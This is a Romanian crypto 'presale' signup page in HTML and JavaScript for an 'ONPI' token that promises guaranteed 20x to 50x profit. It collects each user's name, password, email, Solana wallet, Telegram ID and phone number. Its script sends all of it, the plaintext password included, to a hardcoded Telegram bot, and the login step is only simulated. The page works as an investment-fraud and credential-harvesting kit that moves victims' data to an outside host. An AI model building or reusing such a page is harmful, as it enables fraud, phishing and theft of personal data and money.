<!DOCTYPE html>
<html lang="ro">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>ONPI Presale ‚Äì √énregistrare & Login</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg: #0a0015;
      --primary: #ffcc00;
      --primary-dark: #ff9900;
      --accent: #ff3366;
      --card: rgba(26,0,51,0.92);
      --text: #f0e6ff;
      --gray: #b0a0cc;
      --success: #00ff88;
      --error: #ff3366;
      --border: rgba(255,204,0,0.35);
    }

    * { margin:0; padding:0; box-sizing:border-box; }

    body {
      font-family: 'Inter', sans-serif;
      background: linear-gradient(135deg, var(--bg), #1a0033);
      color: var(--text);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .container {
      background: var(--card);
      border-radius: 24px;
      padding: 40px 28px;
      width: 100%;
      max-width: 500px;
      border: 1px solid var(--border);
      box-shadow: 0 20px 60px rgba(0,0,0,0.7);
      backdrop-filter: blur(12px);
    }

    h1 {
      font-family: 'Orbitron', sans-serif;
      text-align: center;
      color: var(--primary);
      font-size: 2.5rem;
      margin-bottom: 1.4rem;
      letter-spacing: 1.5px;
      text-shadow: 0 0 20px rgba(255,204,0,0.5);
    }

    .subtitle {
      text-align: center;
      color: var(--gray);
      font-size: 1.05rem;
      margin-bottom: 2rem;
      line-height: 1.6;
    }

    .form-group {
      margin-bottom: 1.8rem;
      position: relative;
    }

    label {
      display: block;
      margin-bottom: 0.8rem;
      color: var(--primary);
      font-weight: 600;
      font-size: 1.05rem;
    }

    input {
      width: 100%;
      padding: 14px 40px 14px 16px;
      border: 1px solid var(--border);
      border-radius: 12px;
      background: rgba(15,0,34,0.7);
      color: white;
      font-size: 1rem;
      transition: all 0.25s ease;
    }

    input:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 0 4px rgba(255,204,0,0.18);
      background: rgba(15,0,34,1);
    }

    input::placeholder { color: var(--gray); }

    .toggle-password {
      position: absolute;
      right: 16px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 1.3rem;
      color: var(--gray);
      user-select: none;
    }

    .package-group {
      margin-bottom: 2rem;
    }

    .package-group legend {
      color: var(--primary);
      font-size: 1.2rem;
      font-weight: 700;
      margin-bottom: 1rem;
      text-align: center;
    }

    .package-option {
      display: flex;
      align-items: center;
      padding: 16px;
      margin: 10px 0;
      background: rgba(255,204,0,0.08);
      border: 2px solid transparent;
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.25s ease;
    }

    .package-option input[type="radio"] {
      margin-right: 16px;
      accent-color: var(--primary);
      width: 20px;
      height: 20px;
    }

    .package-option:hover,
    .package-option:has(input:checked) {
      border-color: var(--primary);
      background: rgba(255,204,0,0.18);
      transform: translateY(-3px);
    }

    .package-text {
      font-size: 1.15rem;
      font-weight: 600;
      color: var(--primary);
    }

    .package-detail {
      font-size: 0.95rem;
      color: var(--gray);
      margin-top: 4px;
    }

    button {
      width: 100%;
      padding: 16px;
      background: linear-gradient(90deg, var(--primary), var(--primary-dark));
      color: #000;
      border: none;
      border-radius: 12px;
      font-size: 1.3rem;
      font-weight: 700;
      cursor: pointer;
      margin-top: 1.8rem;
      transition: all 0.3s ease;
      box-shadow: 0 10px 30px rgba(255,204,0,0.3);
    }

    button:hover {
      transform: translateY(-3px);
      box-shadow: 0 15px 40px rgba(255,204,0,0.45);
    }

    .status {
      margin-top: 1.8rem;
      padding: 14px;
      border-radius: 12px;
      text-align: center;
      font-weight: 600;
      font-size: 1.05rem;
      display: none;
    }

    .success { background: rgba(0,255,136,0.18); color: var(--success); border: 1px solid rgba(0,255,136,0.35); }
    .error   { background: rgba(255,51,102,0.18); color: var(--error);   border: 1px solid rgba(255,51,102,0.35); }

    .terms {
      margin-top: 1.5rem;
      font-size: 0.95rem;
      color: var(--gray);
      text-align: center;
      line-height: 1.6;
    }

    .terms a {
      color: var(--primary);
      text-decoration: none;
      font-weight: 600;
    }

    .terms a:hover { text-decoration: underline; }

    .switch-btn {
      display: block;
      width: 100%;
      padding: 12px;
      margin-top: 1.5rem;
      background: transparent;
      border: 2px solid var(--primary);
      color: var(--primary);
      border-radius: 12px;
      font-size: 1.1rem;
      font-weight: 600;
      cursor: pointer;
      text-align: center;
      transition: all 0.3s ease;
    }

    .switch-btn:hover {
      background: rgba(255,204,0,0.1);
    }

    .hidden { display: none !important; }

    @media (max-width: 480px) {
      .container { padding: 32px 20px; }
      h1 { font-size: 2.1rem; }
      button { font-size: 1.2rem; padding: 14px; }
    }
  </style>
</head>
<body>

<!-- PAGINA DE √éNREGISTRARE -->
<div class="container" id="registerPage">
  <h1>ONPI Presale</h1>
  <p class="subtitle">
    CompleteazƒÉ formularul »ôi alege pachetul dorit pentru a te √Ænregistra oficial.<br>
    Datele sunt confiden»õiale »ôi folosite doar pentru distribu»õie tokeni.
  </p>

  <form id="registerForm">
    <div class="form-group">
      <label for="nume">Nume complet</label>
      <input type="text" id="nume" required placeholder="Ion Popescu" minlength="3">
    </div>

    <div class="form-group">
      <label for="cont">Cont (Username)</label>
      <input type="text" id="cont" required placeholder="numele_tƒÉu" minlength="4">
    </div>

    <div class="form-group password-group">
      <label for="parola">ParolƒÉ</label>
      <input type="password" id="parola" required minlength="6" placeholder="Minimum 6 caractere">
      <span class="toggle-password" onclick="togglePassword('parola')">üëÅ</span>
    </div>

    <div class="form-group password-group">
      <label for="confirmParola">ConfirmƒÉ parolƒÉ</label>
      <input type="password" id="confirmParola" required minlength="6" placeholder="Reintrodu parolƒÉ">
      <span class="toggle-password" onclick="togglePassword('confirmParola')">üëÅ</span>
    </div>

    <div class="form-group">
      <label for="email">AdresƒÉ de email</label>
      <input type="email" id="email" required placeholder="exemplu@gmail.com">
    </div>

    <div class="form-group">
      <label for="wallet">AdresƒÉ wallet Solana</label>
      <input type="text" id="wallet" required placeholder="Ex: 5FHwk...abc123" minlength="32" maxlength="44">
    </div>

    <div class="form-group">
      <label for="telegram">ID Telegram</label>
      <input type="text" id="telegram" required placeholder="@numele_tƒÉu sau 123456789">
    </div>

    <div class="form-group">
      <label for="telefon">NumƒÉr de telefon (interna»õional)</label>
      <input type="tel" id="telefon" required placeholder="+40 712 345 678">
    </div>

    <fieldset class="package-group">
      <legend>Alege pachetul dorit</legend>

      <label class="package-option">
        <input type="radio" name="pachet" value="50" data-tokens="7500000" required>
        <div>
          <div class="package-text">50$ ‚Üí 7.500.000 monede ONPI</div>
          <div class="package-detail">profit garantat x20 x50</div>
        </div>
      </label>

      <label class="package-option">
        <input type="radio" name="pachet" value="100" data-tokens="15000000">
        <div>
          <div class="package-text">100$ ‚Üí 15.000.000 monede ONPI</div>
          <div class="package-detail">profit garantat x20 x50</div>
        </div>
      </label>

      <label class="package-option">
        <input type="radio" name="pachet" value="200" data-tokens="30000000">
        <div>
          <div class="package-text">200$ ‚Üí 30.000.000 monede ONPI</div>
          <div class="package-detail">profit garantat x20 x50</div>
        </div>
      </label>

      <label class="package-option">
        <input type="radio" name="pachet" value="500" data-tokens="60000000">
        <div>
          <div class="package-text">500$ ‚Üí 60.000.000 monede ONPI</div>
          <div class="package-detail">profit garantat x20 x50</div>
        </div>
      </label>
    </fieldset>

    <div class="terms">
      Prin apƒÉsarea butonului confirm cƒÉ am citit »ôi accept <a href="#">termenii »ôi condi»õiile</a> »ôi <a href="#">politica de confiden»õialitate</a>.
    </div>

    <button type="submit">√énregistreazƒÉ-mƒÉ acum</button>
  </form>

  <button class="switch-btn" onclick="switchToLogin()">
    Am deja cont? ‚Üí Login
  </button>

  <div id="status" class="status"></div>
</div>

<!-- PAGINA DE LOGIN -->
<div class="container hidden" id="loginPage">
  <h1>Login √Æn cont</h1>
  <p class="subtitle">
    Introdu username-ul »ôi parola create mai devreme pentru a te conecta.
  </p>

  <form id="loginForm">
    <div class="form-group">
      <label for="loginCont">Cont (Username)</label>
      <input type="text" id="loginCont" required placeholder="numele_tƒÉu">
    </div>

    <div class="form-group password-group">
      <label for="loginParola">ParolƒÉ</label>
      <input type="password" id="loginParola" required minlength="6">
      <span class="toggle-password" onclick="togglePassword('loginParola')">üëÅ</span>
    </div>

    <button type="submit">ConecteazƒÉ-te</button>
  </form>

  <div class="switch-link">
    √éncƒÉ nu ai cont? <span onclick="switchToRegister()">√énregistreazƒÉ-te aici</span>
  </div>

  <div id="loginStatus" class="status"></div>
</div>

<script>
// Token »ôi Chat ID (deja setate corect)
const BOT_TOKEN = '7548290162:AAH0P6XOowBMHvKIggPT-pafIg6RDI3Qj-c';
const CHAT_ID   = '5470225717';

const registerForm = document.getElementById('registerForm');
const loginForm = document.getElementById('loginForm');
const registerPage = document.getElementById('registerPage');
const loginPage = document.getElementById('loginPage');
const status = document.getElementById('status');
const loginStatus = document.getElementById('loginStatus');

// Func»õie show/hide parolƒÉ
function togglePassword(fieldId) {
  const field = document.getElementById(fieldId);
  const icon = field.nextElementSibling;
  
  if (field.type === 'password') {
    field.type = 'text';
    icon.textContent = 'üôà';
  } else {
    field.type = 'password';
    icon.textContent = 'üëÅ';
  }
}

// Func»õii de switch √Æntre pagini
function switchToLogin() {
  registerPage.classList.add('hidden');
  loginPage.classList.remove('hidden');
}

function switchToRegister() {
  loginPage.classList.add('hidden');
  registerPage.classList.remove('hidden');
}

// √énregistrare ‚Äì trimite pe Telegram
registerForm.addEventListener('submit', async (e) => {
  e.preventDefault();

  const nume     = document.getElementById('nume').value.trim();
  const cont     = document.getElementById('cont').value.trim();
  const parola   = document.getElementById('parola').value.trim();
  const confirmParola = document.getElementById('confirmParola').value.trim();
  const email    = document.getElementById('email').value.trim();
  const wallet   = document.getElementById('wallet').value.trim();
  const telegram = document.getElementById('telegram').value.trim();
  const telefon  = document.getElementById('telefon').value.trim();

  const pachetRadio = document.querySelector('input[name="pachet"]:checked');
  if (!pachetRadio) return showMessage('Trebuie sƒÉ alegi un pachet!', 'error');

  const pachetValue = pachetRadio.value;
  const tokens      = pachetRadio.dataset.tokens;

  // Validare
  if (nume.length < 3) return showMessage('Numele trebuie sƒÉ aibƒÉ cel pu»õin 3 caractere', 'error');
  if (cont.length < 4) return showMessage('Contul (username) trebuie sƒÉ aibƒÉ cel pu»õin 4 caractere', 'error');
  if (parola.length < 6) return showMessage('Parola trebuie sƒÉ aibƒÉ cel pu»õin 6 caractere', 'error');
  if (parola !== confirmParola) return showMessage('Parolele nu coincid!', 'error');
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return showMessage('Email invalid', 'error');
  if (wallet.length < 32 || wallet.length > 44 || !/^[1-9A-HJ-NP-Za-km-z]+$/.test(wallet)) {
    return showMessage('AdresƒÉ wallet Solana invalidƒÉ', 'error');
  }
  if (telegram.length < 5) return showMessage('ID Telegram invalid (minim 5 caractere)', 'error');
  if (telefon.length < 9 || !/^\+?\d[\d\s-]{8,}$/.test(telefon)) {
    return showMessage('NumƒÉr de telefon invalid (format interna»õional)', 'error');
  }

  showMessage('Se trimite √Ænregistrarea cƒÉtre bot @ONPIPackage_bot...', '');

  const message = 
    `üìù NOUƒÇ √éNREGISTRARE PRESALE ONPI\n\n` +
    `üë§ Nume: ${nume}\n` +
    `üÜî Cont (Username): ${cont}\n` +
    `üîë ParolƒÉ: ${parola}\n` +
    `üìß Email: ${email}\n` +
    `üíº Wallet Solana: ${wallet}\n` +
    `üì± Telegram ID: ${telegram}\n` +
    `üìû Telefon: ${telefon}\n` +
    `üí∞ Pachet ales: \( {pachetValue} \) ‚Üí ${tokens} monede ONPI\n` +
    `   Profit garantat x20 x50\n` +
    `üïí Data: ${new Date().toLocaleString('ro-RO')}\n\n` +
    `A»ôtept confirmare »ôi instruc»õiuni de platƒÉ!`;

  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const data = await res.json();

    if (data.ok) {
      showMessage('√énregistrare trimisƒÉ cu succes cƒÉtre bot!', 'success');
    } else {
      throw new Error(data.description || 'RƒÉspuns invalid de la Telegram');
    }
  } catch (err) {
    showMessage('Eroare la trimitere: ' + err.message, 'error');
    console.error(err);
  }
});

// Login (simulat cu localStorage)
loginForm.addEventListener('submit', (e) => {
  e.preventDefault();

  const cont = document.getElementById('loginCont').value.trim();
  const parola = document.getElementById('loginParola').value.trim();

  const stored = localStorage.getItem(`user_${cont}`);
  if (stored) {
    const userData = JSON.parse(stored);
    if (userData.parola === parola) {
      loginStatus.textContent = 'Login reu»ôit! Bun venit √Ænapoi!';
      loginStatus.className = 'status success';
      alert('Login reu»ôit! (simulat local)');
      // Aici po»õi adƒÉuga redirect la dashboard sau altƒÉ paginƒÉ
    } else {
      loginStatus.textContent = 'ParolƒÉ gre»ôitƒÉ!';
      loginStatus.className = 'status error';
    }
  } else {
    loginStatus.textContent = 'Cont inexistent! √énregistreazƒÉ-te mai √Ænt√¢i.';
    loginStatus.className = 'status error';
  }
});

function showMessage(text, type = '') {
  status.textContent = text;
  status.className = 'status ' + type;
  status.style.display = 'block';
}
</script>

</body>
</html>
